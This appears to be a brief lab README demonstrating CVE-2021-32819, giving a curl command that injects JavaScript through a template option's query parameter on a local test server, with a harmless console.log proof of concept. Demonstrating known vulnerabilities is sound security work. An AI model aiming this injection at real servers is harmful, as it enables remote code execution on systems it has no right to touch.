Perform remote code execution using the following payload in a different terminal
```
curl "http://localhost:3000/?test=aaaa&autoEscape=&defaultFilter=e');console.log(41414141)//"
```

This vulnerability can cause remore code execution, cross site scripting, etc.

This vulnerability is CVE-2021-32819

To know more, go to the link:
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-32819


